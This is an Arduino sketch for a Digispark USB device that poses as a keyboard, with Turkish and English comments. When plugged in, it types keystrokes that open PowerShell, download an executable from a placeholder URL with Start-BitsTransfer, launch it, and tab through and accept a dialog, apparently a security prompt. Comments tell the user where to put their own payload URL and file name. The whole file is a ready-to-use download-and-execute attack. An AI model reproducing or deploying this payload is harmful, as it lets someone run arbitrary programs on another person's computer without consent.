#define kbd_tr_tr
// TÜRKÇE KLAVYE KULLANIYORSAN ELLEME
// Change here if you are using an English keyboard.  kbd_en_en

#include "DigiKeyboard.h"

void setup() {
  

}

void loop() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("powershell");
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  // HTTPS KISMINDAN İTİBAREN İNDİRMEK İSTEDİĞİNİZ DOSYANIN KONUMUNU GİRİNİZ. BİR BOŞLUK BIRAKIP KAYDEDİLMESİ İSTENEN İSMİ GİRİNİZ.
  // ENTER THE LOCATION OF THE FILE YOU WANT TO DOWNLOAD FROM HTTPS. ENTER THE NAME REQUESTED TO BE SAVED WITH.
  DigiKeyboard.print("Start-Bitstransfer https://www.youwebsite.com/file.exe file.exe");
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  // BURADAKİ SANİYE MİKTARI DOSYANIN BOYUTUNA GÖRE DÜŞÜRÜLÜR VEYA YÜKSELTİLİR:
  DigiKeyboard.delay(8000);
  DigiKeyboard.print("exit");
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(1000);
  // 20.SATIRDA KAYDETTİĞİNİZ İSMİ GİRİNİZ.
  // ENTER THE NAME YOU SAVED IN LINE 20.
  DigiKeyboard.print("file.exe");
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1500);
  DigiKeyboard.write('\t');
  DigiKeyboard.delay(100);
  DigiKeyboard.write('\t');
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  // BURADAKİ 100000 SANİYE KOMUTLAR BİTTİKTEN SONRA EN BAŞTAN TEKRARLAMASIN DİYE.
  DigiKeyboard.delay(100000);
}
